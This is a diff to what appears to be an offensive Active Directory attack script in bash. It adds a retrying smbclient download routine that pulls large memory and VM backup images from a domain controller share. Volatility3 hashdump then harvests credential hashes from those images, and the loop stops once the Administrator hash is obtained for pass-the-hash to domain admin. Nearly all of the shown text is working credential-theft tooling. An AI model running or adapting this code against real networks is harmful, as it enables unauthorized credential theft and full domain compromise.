@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.48.3"
+readonly VERSION="1.48.4"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -4806,6 +4806,35 @@ _vol_ingest_hashes() {
     return $((got ? 0 : 1))
 }
 
+# Robustly fetch one (possibly multi-GB) file via smbclient. The default per-operation
+# timeout silently TRUNCATES slow/large transfers, and a non-empty partial then
+# masquerades as a finished download (e.g. 1.3 GB of a 2 GB .vmem → vol3 rejects it as
+# "not acquired cleanly"). So bump the timeout, VERIFY the local size against the
+# remote, and retry.  <share> <backslash-rpath> <local_f>  → 0 only when complete.
+_smb_download() {
+    local share="$1" rpath="$2" local_f="$3"
+    local smbargs; mapfile -t smbargs < <(smb_cred_args)
+    local rsize lsize try
+    # remote size = the largest integer on the file's `ls` line (the byte count)
+    rsize=$(smbclient "//${DCT}/${share}" "${smbargs[@]}" -t 60 -c "ls \"$rpath\"" 2>/dev/null \
+            | grep -oE '[0-9]{4,}' | sort -rn | head -1)
+    for try in 1 2 3; do
+        rm -f "$local_f"                          # smbclient can't resume → start clean
+        smbclient "//${DCT}/${share}" "${smbargs[@]}" -t 300 -b 65536 \
+                  -c "get \"$rpath\" \"$local_f\"" >>"$LOGFILE" 2>&1
+        lsize=$(stat -c%s "$local_f" 2>/dev/null || echo 0)
+        if [[ -n "$rsize" ]]; then
+            [[ "$lsize" -ge "$rsize" ]] && return 0
+        elif [[ "$lsize" -gt 0 ]]; then
+            return 0                              # remote size unknown but we got data
+        fi
+        warn "  incomplete transfer ($((lsize/1048576))MB${rsize:+/$((rsize/1048576))MB}) → retry $try/3"
+        sleep 2
+    done
+    warn "  smbclient could not fully fetch '$rpath' after 3 tries"
+    return 1
+}
+
 # Run volatility3 (+ optional cracking of MSCACHE) over one memory image. $1=file
 _harvest_memimage() {
     local img="$1" vb base; base=$(basename "$img")
@@ -4935,13 +4964,10 @@ PYEOF
         if [[ "${bytes:-0}" -gt $((cap_mb*1024*1024)) ]]; then
             abuse_confirm "  Download ${human} image '${path##*/}'? (large; set MAX_DUMP_MB to raise the auto cap)" || { info "  Skipped (size)"; continue; }
         fi
-        mapfile -t smbargs < <(smb_cred_args)
         local_f="$dumpdir/$(basename "$path")"
         local rpath="${path//\//\\}"             # smbclient wants backslash paths
-        run "smbclient //${DCT}/${share} <creds> -c 'get \"${rpath}\" \"${local_f}\"'"
-        if ! smbclient "//${DCT}/${share}" "${smbargs[@]}" \
-                -c "lcd \"$dumpdir\"; get \"$rpath\" \"$local_f\"" >>"$LOGFILE" 2>&1 \
-                || [[ ! -s "$local_f" ]]; then
+        run "smbclient //${DCT}/${share} <creds> -t 300 -c 'get \"${rpath}\"'  (size-verified + retries)"
+        if ! _smb_download "$share" "$rpath" "$local_f"; then
             warn "  Download failed → $path"; continue
         fi
         loot "  Pulled $(du -h "$local_f" 2>/dev/null | cut -f1) → ${local_f#$OUTDIR/}"
@@ -4959,6 +4985,13 @@ PYEOF
             rm -f "$local_f" 2>/dev/null; detail "      (removed local copy; set KEEP_DUMPS=1 to retain)"
         else
             warn "  Kept ${local_f#$OUTDIR/} (nothing harvested) — retry: $(_vol_bin 2>/dev/null || echo vol) -f '$local_f' windows.hashdump"
+        fi
+        # Got Administrator from a backup → the remaining images (often a 9.5 GB .vmdk)
+        # are redundant: the local Admin hash → PtH → DA is the win. Stop pulling more
+        # multi-GB files unless the user explicitly wants the full harvest.
+        if [[ "${DUMP_ALL:-0}" != "1" ]] && _have_creds_for "Administrator"; then
+            info "  Recovered Administrator — skipping remaining backup images (set DUMP_ALL=1 to pull them all)"
+            break
         fi
     done <<<"$matches"
 }
